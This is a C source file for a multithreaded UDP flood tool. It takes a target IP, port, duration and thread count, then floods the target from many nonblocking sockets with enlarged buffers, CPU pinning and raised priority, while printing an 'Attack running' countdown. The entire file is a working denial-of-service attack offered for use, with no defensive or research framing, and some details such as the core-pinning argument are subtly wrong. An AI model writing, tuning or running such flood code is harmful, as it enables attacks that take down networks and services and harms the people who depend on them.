#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sched.h>
#include <errno.h>

// Ultra-Optimized Configuration
#define MAX_PACKET_SIZE 1400
#define SOCKETS_PER_THREAD 8
#define SOCKET_BUFFER_SIZE (1024 * 1024 * 100) // 100MB
#define THREAD_SLEEP_NS 250000 // 0.25ms between bursts

typedef struct {
    const char *target_ip;
    uint16_t target_port;
    volatile int *running;
} AttackParams;

// Pre-generated static packet (better than random)
static char packet[MAX_PACKET_SIZE];

// Critical Fix 1: CPU pinning for better performance
void pin_thread_to_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

// Critical Fix 2: Precision timing for countdown
void display_countdown(int duration) {
    struct timespec start, now;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        int elapsed = now.tv_sec - start.tv_sec;
        int remaining = duration - elapsed;
        
        if (remaining <= 0) break;
        
        printf("\rAttack running... Time remaining: %02d:%02d", 
              remaining/60, remaining%60);
        fflush(stdout);
        usleep(100000); // Update every 100ms
    }
    printf("\nAttack completed!\n");
}

// Critical Fix 3: Socket reuse and error recovery
void create_sockets(int *socks, struct sockaddr_in *dest_addr) {
    int opt = 1;
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        int sock = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
        if (sock < 0) continue;

        // Enable socket reuse and buffer expansion
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));
        
        int buf_size = SOCKET_BUFFER_SIZE;
        setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        
        connect(sock, (struct sockaddr*)dest_addr, sizeof(*dest_addr));
        socks[i] = sock;
    }
}

// Critical Fix 4: Traffic pacing with error handling
void* udp_flood(void *arg) {
    AttackParams *params = (AttackParams*)arg;
    struct sockaddr_in dest_addr;
    int socks[SOCKETS_PER_THREAD] = {0};
    struct timespec ts = {0, THREAD_SLEEP_NS};

    // Target setup
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &dest_addr.sin_addr);

    // Create optimized sockets
    create_sockets(socks, &dest_addr);

    // Set CPU affinity
    pin_thread_to_core(pthread_self());

    // Attack loop with error recovery
    while (*params->running) {
        for (int s = 0; s < SOCKETS_PER_THREAD; s++) {
            if (socks[s] <= 0) continue;
            
            ssize_t sent = send(socks[s], packet, MAX_PACKET_SIZE, MSG_DONTWAIT);
            
            // Critical Fix 5: Socket recovery mechanism
            if (sent < 0) {
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    nanosleep(&ts, NULL); // Backoff on congestion
                } else {
                    close(socks[s]);
                    socks[s] = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                    connect(socks[s], (struct sockaddr*)&dest_addr, sizeof(dest_addr));
                }
            }
        }
    }

    // Cleanup
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if (socks[i] > 0) close(socks[i]);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <DURATION> [THREADS]\n", argv[0]);
        return 1;
    }

    // Configuration
    const char *ip = argv[1];
    uint16_t port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = (argc > 4) ? atoi(argv[4]) : 4;

    // Initialize static packet pattern (better performance)
    memset(packet, 0xAA, MAX_PACKET_SIZE);

    // Critical Fix 6: Network priority boost
    int prio = -15; // Highest priority
    setpriority(PRIO_PROCESS, 0, prio);

    // Resource setup
    volatile int running = 1;
    pthread_t *threads_arr = malloc(threads * sizeof(pthread_t));
    AttackParams *params = calloc(threads, sizeof(AttackParams));

    // Launch attack threads
    for (int i = 0; i < threads; i++) {
        params[i].target_ip = ip;
        params[i].target_port = port;
        params[i].running = &running;
        
        if (pthread_create(&threads_arr[i], NULL, udp_flood, &params[i])) {
            perror("Thread creation failed");
            running = 0;
            break;
        }
    }

    // Precision timing
    display_countdown(duration);
    running = 0;

    // Cleanup
    for (int i = 0; i < threads; i++) pthread_join(threads_arr[i], NULL);
    free(threads_arr);
    free(params);

    return 0;
}